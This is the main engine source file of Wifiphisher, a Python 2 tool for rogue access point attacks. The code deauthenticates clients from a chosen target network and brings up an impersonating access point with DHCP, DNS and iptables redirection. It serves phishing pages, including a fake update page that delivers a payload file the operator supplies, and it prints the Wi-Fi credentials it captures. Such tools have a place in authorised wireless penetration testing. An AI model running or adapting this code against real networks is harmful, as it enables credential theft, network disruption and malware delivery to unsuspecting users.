#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# pylint: skip-file
import subprocess
import os
import time
import sys
import argparse
import fcntl
import curses
import socket
import struct
import signal
from threading import Thread
from subprocess import Popen, PIPE, check_output
from shutil import copyfile
from wifiphisher.common.constants import *
import wifiphisher.common.extensions as extensions
import wifiphisher.common.recon as recon
import wifiphisher.common.phishingpage as phishingpage
import wifiphisher.common.phishinghttp as phishinghttp
import wifiphisher.common.macmatcher as macmatcher
import wifiphisher.common.interfaces as interfaces
import wifiphisher.common.firewall as firewall
import wifiphisher.common.accesspoint as accesspoint
import wifiphisher.common.tui as tui

# Fixes UnicodeDecodeError for ESSIDs
reload(sys)
sys.setdefaultencoding('utf8')

VERSION = "1.3GIT"
args = 0
APs = {}  # for listing APs


def parse_args():
    # Create the arguments
    parser = argparse.ArgumentParser()

    parser.add_argument(
        "-jI",
        "--jamminginterface",
        help=("Manually choose an interface that supports monitor mode for " +
              "deauthenticating the victims. " +
              "Example: -jI wlan1"
              )
    )
    parser.add_argument(
        "-aI",
        "--apinterface",
        help=("Manually choose an interface that supports AP mode for  " +
              "spawning an AP. " +
              "Example: -aI wlan0"
              )
    )
    parser.add_argument(
        "-iI",
        "--internetinterface",
        help=("Choose an interface that is connected on the Internet" +
              "Example: -iI ppp0"
              )
    )
    parser.add_argument(
        "-nJ",
        "--nojamming",
        help=("Skip the deauthentication phase. When this option is used, " +
              "only one wireless interface is required"
              ),
        action='store_true')
    parser.add_argument(
        "-e",
        "--essid",
        help=("Enter the ESSID of the rogue Access Point. " +
              "This option will skip Access Point selection phase. " +
              "Example: --essid 'Free WiFi'"
              )
    )
    parser.add_argument(
        "-p",
        "--phishingscenario",
        help=("Choose the phishing scenario to run." +
              "This option will skip the scenario selection phase. " +
              "Example: -p firmware_upgrade"))
    parser.add_argument(
        "-pK",
        "--presharedkey",
        help=("Add WPA/WPA2 protection on the rogue Access Point. " +
              "Example: -pK s3cr3tp4ssw0rd"))
    parser.add_argument(
        "-qS",
        "--quitonsuccess",
        help=("Stop the script after successfully retrieving one pair of "
              "credentials"),
        action='store_true')
    parser.add_argument(
        "-lC",
        "--lure10-capture",
        help=("Capture the BSSIDs of the APs that are discovered during "
              "AP selection phase. This option is part of Lure10 attack."),
        action='store_true')
    parser.add_argument(
        "-lE",
        "--lure10-exploit",
        help=("Fool the Windows Location Service of nearby Windows users "
              "to believe it is within an area that was previously captured "
              "with --lure10-capture. Part of the Lure10 attack."))
    parser.add_argument(
        "-iAM",
        "--mac-ap-interface",
        help=("Specify the MAC address of the AP interface"))
    parser.add_argument(
        "-iDM",
        "--mac-deauth-interface",
        help=("Specify the MAC address of the jamming interface"))
    parser.add_argument(
        "-iNM",
        "--no-mac-randomization",
        help=("Do not change any MAC address"), action='store_true')

    return parser.parse_args()


def check_args(args):
    """
    Checks the given arguments for logic errors.
    """

    if args.presharedkey and \
        (len(args.presharedkey) < 8
         or len(args.presharedkey) > 64):
        sys.exit(
            '[' +
            R +
            '-' +
            W +
            '] Pre-shared key must be between 8 and 63 printable characters.')

    if ((args.jamminginterface and not args.apinterface) or
            (not args.jamminginterface and args.apinterface)) and \
            not (args.nojamming and args.apinterface):
        sys.exit(
            '[' +
            R +
            '-' +
            W +
            '] --apinterface (-aI) and --jamminginterface (-jI) (or --nojamming (-nJ)) are used in conjuction.')

    if args.nojamming and args.jamminginterface:
        sys.exit(
            '[' +
            R +
            '-' +
            W +
            '] --nojamming (-nJ) and --jamminginterface (-jI) cannot work together.')

    if args.lure10_exploit and args.nojamming:
        sys.exit(
            '[' +
            R +
            '-' +
            W +
            '] --lure10-exploit (-lE) and --nojamming (-nJ) cannot work together.')

    if args.lure10_exploit and not os.path.isfile(
            LOCS_DIR + args.lure10_exploit):
        sys.exit('[' +
                 R +
                 '-' +
                 W +
                 '] Lure10 capture does not exist. Listing directory of captures: ' +
                 str(os.listdir(LOCS_DIR)))

    if (args.mac_ap_interface and args.no_mac_randomization) or \
            (args.mac_deauth_interface and args.no_mac_randomization):
        sys.exit(
            '[' +
            R +
            '-' +
            W +
            '] --no-mac-randomization (-iNM) cannot work together with --mac-ap-interface or '
            '--mac-deauth-interface (-iDM)')


def set_ip_fwd():
    """
    Set kernel variables.
    """
    Popen(
        ['sysctl', '-w', 'net.ipv4.ip_forward=1'],
        stdout=DN,
        stderr=PIPE
    )


def set_route_localnet():
    """
    Set kernel variables.
    """
    Popen(
        ['sysctl', '-w', 'net.ipv4.conf.all.route_localnet=1'],
        stdout=DN,
        stderr=PIPE
    )


def select_template(template_argument, template_manager):
    """
    Select a template based on whether the template argument is set or not. If
    the template argument is not set, it will interactively ask user for a
    template.

    Args:
        template_argument (str): The template argument which might have been
                                 entered by the user.

    Returns:
        (PhishingTemplate): A PhishingTemplate object.

    Raises:
        InvalidTemplate: In case the template argument entered by the user is
                         not available.
    """

    # get all available templates
    templates = template_manager.get_templates()

    # get all the templates names for display
    template_names = list(templates.keys())

    # check if the template argument is set and is correct
    if template_argument and template_argument in templates:
        # return the template name
        return templates[template_argument]
    elif template_argument and template_argument not in templates:
        # in case of an invalid template
        raise phishingpage.InvalidTemplate
    else:
        # loop until all operations for template selection is done
        while True:
            # clear the screen
            subprocess.call('clear', shell=True)

            # display template header
            print "\nAvailable Phishing Scenarios:\n"

            # display the templates
            for number in range(len(template_names)):
                print (G + str(number + 1) + W + " - " +
                       str(templates[template_names[number]]))

            # get user's choice
            choosen_template = raw_input("\n[" + G + "+" + W +
                                         "] Choose the [" + G + "num" + W +
                                         "] of the scenario you wish to use: ")

            # placed to avoid a program crash in case of non integer input
            try:
                template_number = int(choosen_template)
            except ValueError:
                print "\n[" + R + "-" + W + "] Please input an integer."

                # start from the beginning
                continue

            if template_number not in range(1, len(template_names) + 1):
                print ("\n[" + R + "-" + W + "] Wrong input number! please" +
                       " try again")

                # start from the beginning
                continue

            # remove 1 from template number which was added for display reasons
            template_number -= 1

            # return the chosen template
            return templates[template_names[template_number]]


def mon_mac(mon_iface):
    '''
    http://stackoverflow.com/questions/159137/getting-mac-address
    '''
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    info = fcntl.ioctl(s.fileno(), 0x8927, struct.pack('256s', mon_iface[:15]))
    mac = ''.join(['%02x:' % ord(char) for char in info[18:24]])[:-1]
    print ('[' + G + '*' + W + '] Monitor mode: ' + G
           + mon_iface + W + ' - ' + O + mac + W)
    return mac


def sniff_dot11(mon_iface):
    """
    We need this here to run it from a thread.
    """
    try:
        sniff(iface=mon_iface, store=0, prn=cb, stop_filter=stopfilter)
    except socket.error as e:
        # Network is down
        if e.errno == 100:
            pass
        else:
            raise


def select_access_point(screen, interface, mac_matcher):
    """
    Return the access point the user has selected

    :param screen: A curses window object
    :param interface: An interface to be used for finding access points
    :type screen: _curses.curses.window
    :type interface: NetworkAdapter
    :return: Choosen access point
    :rtype: accesspoint.AccessPoint
    """

    # make cursor invisible
    curses.curs_set(0)

    # don't wait for user input
    screen.nodelay(True)

    # start finding access points
    access_point_finder = recon.AccessPointFinder(interface)
    if args.lure10_capture:
        access_point_finder.capture_aps()
    access_point_finder.find_all_access_points()

    position = 1
    page_number = 1

    # get window height, length and create a box inside
    max_window_height, max_window_length = screen.getmaxyx()
    box = curses.newwin(max_window_height - 9, max_window_length - 5, 4, 3)
    box.box()

    # calculate the box's maximum number of row's
    box_height = box.getmaxyx()[0]
    # subtracting 2 from the height for the border
    max_row = box_height - 2

    # information regarding access points
    access_points = list()
    total_ap_number = 0

    # added so it would go through the first iteration of the loop
    key = 0

    # show information until user presses Esc key
    while key != 27:

        # resize the window if it's dimensions have been changed
        if screen.getmaxyx() != (max_window_height, max_window_length):
            max_window_height, max_window_length = screen.getmaxyx()
            box.resize(max_window_height - 9, max_window_length - 5)

            # calculate the box's maximum number of row's
            box_height = box.getmaxyx()[0]
            # subtracting 2 from the height for the border
            max_row = box_height - 2

            # reset the page and position to avoid problems
            position = 1
            page_number = 1

        # check if any new access points have been discovered
        if len(access_point_finder.get_all_access_points()) != total_ap_number:
            access_points = access_point_finder.get_sorted_access_points()
            total_ap_number = len(access_points)

        # display the information to the user
        display_access_points((screen,
                               box,
                               access_points,
                               total_ap_number,
                               page_number,
                               position),
                              mac_matcher)

        # check for key movement and store result
        key_movement_result = key_movement(
            (key, position, page_number, max_row, access_points))
        key = key_movement_result[0]
        position = key_movement_result[1]
        page_number = key_movement_result[2]

        # ask for a key input (doesn't block)
        key = screen.getch()

        # in case ENTER key has been pressed on a valid access point
        if key == ord("\n") and total_ap_number != 0:
            # show message and exit
            screen.addstr(max_window_height - 2, 3, "YOU HAVE SELECTED " +
                          access_points[position - 1].get_name())
            screen.refresh()
            time.sleep(1)

            # turn off access point discovery and return the result
            access_point_finder.stop_finding_access_points()
            return access_points[position - 1]

    # turn off access point discovery
    access_point_finder.stop_finding_access_points()


def key_movement(information):
    """
    Check for any key movement and return it's result

    :param information: (key, position, page_number, max_row, access_points)
    :type information: tuple
    :return: (key, position, page_number)
    :rtype: tuple
    """

    # extract all the information
    key = information[0]
    position = information[1]
    page_number = information[2]
    max_row = information[3]
    access_points = information[4]

    # in case arrow down key has been pressed
    if key == curses.KEY_DOWN:
        # if next item exists move down, otherwise don't move
        try:
            access_points[position]
        except IndexError:
            key = 0
            return (key, position, page_number)

        # if next item is in the next page change page and move
        # down otherwise just move down)
        if position % max_row == 0:
            position += 1
            page_number += 1
        else:
            position += 1

    # in case arrow up key has been pressed
    elif key == curses.KEY_UP:
        # if not the first item
        if (position - 1) > 0:
            # if previous item is in previous page_number, change page
            # and move up otherwise just move up
            if (position - 1) % max_row == 0:
                position -= 1
                page_number -= 1
            else:
                position -= 1

    return (key, position, page_number)


def kill_interfering_procs():
    """
    Kill the interfering processes that may interfere the wireless card
    :return None
    :rtype None
    ..note: The interfering processes are referenced by airmon-zc, and
    we have removed the NetworkManager and knetworkmanager since we
    use dbus to handle them.
    """

    # disable the networkmanager
    interfaces.toggle_networking(False)
    # Kill any possible programs that may interfere with the wireless card
    proc = Popen(['ps', '-A'], stdout=subprocess.PIPE)
    output = proc.communicate()[0]
    # total processes in the system
    sys_procs = output.splitlines()
    # loop each interfering processes and find if it is running
    for interfering_proc in INTEFERING_PROCS:
        for proc in sys_procs:
            # kill all the processes name equal to interfering_proc
            if interfering_proc in proc:
                pid = int(proc.split(None, 1)[0])
                print '[' + G + '+' + W + "] Sending SIGKILL to " +\
                    interfering_proc
                os.kill(pid, signal.SIGKILL)


class WifiphisherEngine:

    def __init__(self):
        self.mac_matcher = macmatcher.MACMatcher(MAC_PREFIX_FILE)
        self.network_manager = interfaces.NetworkManager()
        self.template_manager = phishingpage.TemplateManager()
        self.access_point = accesspoint.AccessPoint()
        self.fw = firewall.Fw()
        self.em = extensions.ExtensionManager(self.network_manager)

    def stop(self):
        print "[" + G + "+" + W + "] Captured credentials:"
        for cred in phishinghttp.creds:
            print cred

        # EM depends on Network Manager.
        # It has to shutdown first.
        self.em.on_exit()
        self.network_manager.on_exit()
        self.template_manager.on_exit()
        self.access_point.on_exit()
        self.fw.on_exit()

        if os.path.isfile('/tmp/wifiphisher-webserver.tmp'):
            os.remove('/tmp/wifiphisher-webserver.tmp')

        print '[' + R + '!' + W + '] Closing'
        sys.exit(0)

    def start(self):
        # Parse args
        global args, APs
        args = parse_args()

        # Check args
        check_args(args)

        # Are you root?
        if os.geteuid():
            sys.exit('[' + R + '-' + W + '] Please run as root')

        if not args.internetinterface:
            kill_interfering_procs()

        self.network_manager.start()

        # TODO: We should have more checks here:
        # Is anything binded to our HTTP(S) ports?
        # Maybe we should save current iptables rules somewhere

        # get interfaces for monitor mode and AP mode and set the monitor interface
        # to monitor mode. shutdown on any errors
        try:
            if args.internetinterface:
                if self.network_manager.is_interface_valid(
                        args.internetinterface, "internet"):
                    internet_interface = args.internetinterface
                    self.network_manager.unblock_interface(internet_interface)
            if not args.nojamming:
                if args.jamminginterface and args.apinterface:
                    if self.network_manager.is_interface_valid(
                            args.jamminginterface, "monitor"):
                        mon_iface = args.jamminginterface
                        self.network_manager.unblock_interface(mon_iface)
                    if self.network_manager.is_interface_valid(
                            args.apinterface, "AP"):
                        ap_iface = args.apinterface
                else:
                    mon_iface, ap_iface = self.network_manager.get_interface_automatically()
                # display selected interfaces to the user
                print (
                    "[{0}+{1}] Selecting {0}{2}{1} interface for the deauthentication "
                    "attack\n[{0}+{1}] Selecting {0}{3}{1} interface for creating the "
                    "rogue Access Point").format(
                    G, W, mon_iface, ap_iface)

                # randomize the mac addresses
                if not args.no_mac_randomization:
                    if args.mac_ap_interface:
                        self.network_manager.set_interface_mac(
                            ap_iface, args.mac_ap_interface)
                    else:
                        self.network_manager.set_interface_mac_random(ap_iface)
                    if args.mac_deauth_interface:
                        self.network_manager.set_interface_mac(
                            mon_iface, args.mac_deauth_interface)
                    else:
                        self.network_manager.set_interface_mac_random(
                            mon_iface)
            else:
                if args.apinterface:
                    if self.network_manager.is_interface_valid(
                            args.apinterface, "AP"):
                        ap_iface = args.apinterface
                else:
                    ap_iface = self.network_manager.get_interface(True, False)
                mon_iface = ap_iface

                if not args.no_mac_randomization:
                    if args.mac_ap_interface:
                        self.network_manager.set_interface_mac(
                            ap_iface, args.mac_ap_interface)
                    else:
                        self.network_manager.set_interface_mac_random(ap_iface)

                print (
                    "[{0}+{1}] Selecting {0}{2}{1} interface for creating the "
                    "rogue Access Point").format(
                    G, W, ap_iface)
                # randomize the mac addresses
                if not args.no_mac_randomization:
                    self.network_manager.set_interface_mac_random(ap_iface)

            # make sure interfaces are not blocked
            self.network_manager.unblock_interface(ap_iface)
            self.network_manager.unblock_interface(mon_iface)
            self.network_manager.set_interface_mode(mon_iface, "monitor")
        except (interfaces.InvalidInterfaceError,
                interfaces.InterfaceCantBeFoundError,
                interfaces.InterfaceManagedByNetworkManagerError) as err:
            print ("[{0}!{1}] {2}").format(R, W, err)

            time.sleep(1)
            self.stop()

        if not args.no_mac_randomization:
            ap_mac = self.network_manager.get_interface_mac(ap_iface)
            print "[{0}+{1}] Changing {2} MAC addr (BSSID) to {3}".format(G, W, ap_iface, ap_mac)

            if not args.nojamming:
                mon_mac = self.network_manager.get_interface_mac(mon_iface)
                print ("[{0}+{1}] Changing {2} MAC addr (BSSID) to {3}".format(G, W, mon_iface, mon_mac))

        if args.internetinterface:
            self.fw.nat(ap_iface, args.internetinterface)
            set_ip_fwd()
        else:
            self.fw.redirect_requests_localhost()
        set_route_localnet()

        print '[' + T + '*' + W + '] Cleared leases, started DHCP, set up iptables'
        time.sleep(1)

        if args.essid:
            essid = args.essid
            channel = str(CHANNEL)
            ap_mac = None
            enctype = None
        else:
            # let user choose access point
            ap_info_object = tui.ApSelInfo(mon_iface, self.mac_matcher,
                                           self.network_manager, args)
            ap_sel_object = tui.TuiApSel()
            access_point = curses.wrapper(ap_sel_object.gather_info,
                                          ap_info_object)
            # if the user has chosen a access point continue
            # otherwise shutdown
            if access_point:
                # store choosen access point's information
                essid = access_point.get_name()
                channel = access_point.get_channel()
                ap_mac = access_point.get_mac_address()
                enctype = access_point.get_encryption()
            else:
                self.stop()
        # create a template manager object
        self.template_manager = phishingpage.TemplateManager()
        # get the correct template
        tui_template_obj = tui.TuiTemplateSelection() 
        template = tui_template_obj.gather_info(args.phishingscenario, self.template_manager)
        print ("[" + G + "+" + W + "] Selecting " +
               template.get_display_name() + " template")

        # payload selection for browser plugin update
        if template.has_payload():
            payload_path = False
            # copy payload to update directory
            while not payload_path or not os.path.isfile(payload_path):
                # get payload path
                payload_path = raw_input(
                    "[" +
                    G +
                    "+" +
                    W +
                    "] Enter the [" +
                    G +
                    "full path" +
                    W +
                    "] to the payload you wish to serve: ")
                if not os.path.isfile(payload_path):
                    print '[' + R + '-' + W + '] Invalid file path!'
            print '[' + T + '*' + W + '] Using ' + G + payload_path + W + ' as payload '
            copyfile(payload_path, PHISHING_PAGES_DIR +
                     template.get_payload_path())

        APs_context = []
        for i in APs:
            APs_context.append({
                'channel': APs[i][0] or "",
                'essid': APs[i][1] or "",
                'bssid': APs[i][2] or "",
                'vendor': self.mac_matcher.get_vendor_name(APs[i][2]) or ""
            })

        template.merge_context({'APs': APs_context})

        # only get logo path if MAC address is present
        ap_logo_path = False
        if ap_mac:
            ap_logo_path = template.use_file(
                self.mac_matcher.get_vendor_logo_path(ap_mac))

        template.merge_context({
            'target_ap_channel': channel or "",
            'target_ap_essid': essid or "",
            'target_ap_bssid': ap_mac or "",
            'target_ap_encryption': enctype or "",
            'target_ap_vendor': self.mac_matcher.get_vendor_name(ap_mac) or "",
            'target_ap_logo_path': ap_logo_path or ""
        })

        # We want to set this now for hostapd. Maybe the interface was in "monitor"
        # mode for network discovery before (e.g. when --nojamming is enabled).
        self.network_manager.set_interface_mode(ap_iface, "managed")
        # Start AP
        self.access_point.set_interface(ap_iface)
        self.access_point.set_channel(channel)
        self.access_point.set_essid(essid)
        if args.presharedkey:
            self.access_point.set_psk(args.presharedkey)
        if args.internetinterface:
            self.access_point.set_internet_interface(args.internetinterface)
        print '[' + T + '*' + W + '] Starting the fake access point...'
        try:
            self.access_point.start()
            self.access_point.start_dhcp_dns()
        except BaseException:
            self.stop()

        # If are on Advanced mode, start Extension Manager (EM)
        # We need to start EM before we boot the web server
        if not args.nojamming:
            shared_data = {
                'target_ap_channel': channel or "",
                'target_ap_essid': essid or "",
                'target_ap_bssid': ap_mac or "",
                'target_ap_encryption': enctype or "",
                'target_ap_logo_path': ap_logo_path or "",
                'rogue_ap_mac': ap_mac,
                'APs': APs_context,
                'args': args
            }
            self.em.set_interface(mon_iface)
            extensions = DEFAULT_EXTENSIONS
            if args.lure10_exploit:
                extensions.append(LURE10_EXTENSION)
            self.em.set_extensions(extensions)
            self.em.init_extensions(shared_data)
            self.em.start_extensions()

        # With configured DHCP, we may now start the web server
        if not args.internetinterface:
            # Start HTTP server in a background thread
            print '[' + T + '*' + W + '] Starting HTTP/HTTPS server at ports ' + str(PORT) + ", " + str(SSL_PORT)
            webserver = Thread(target=phishinghttp.runHTTPServer,
                               args=(NETWORK_GW_IP, PORT, SSL_PORT, template, self.em))
            webserver.daemon = True
            webserver.start()

            time.sleep(1.5)

        # We no longer need mac_matcher
        self.mac_matcher.unbind()

        clients_APs = []
        APs = []

        # Main loop.
        try:
            main_info = tui.MainInfo(VERSION, essid, channel, ap_iface,
                                     self.em, phishinghttp,
                                     args)
            tui_main_object = tui.TuiMain()
            curses.wrapper(tui_main_object.gather_info, main_info)
        except KeyboardInterrupt:
            self.stop()


def run():
    try:
        print ('[' + T + '*' + W + '] Starting Wifiphisher %s at %s' %
               (VERSION, time.strftime("%Y-%m-%d %H:%M")))
        engine = WifiphisherEngine()
        engine.start()
    except KeyboardInterrupt:
        print R + '\n (^C)' + O + ' interrupted\n' + W
    except EOFError:
        print R + '\n (^D)' + O + ' interrupted\n' + W
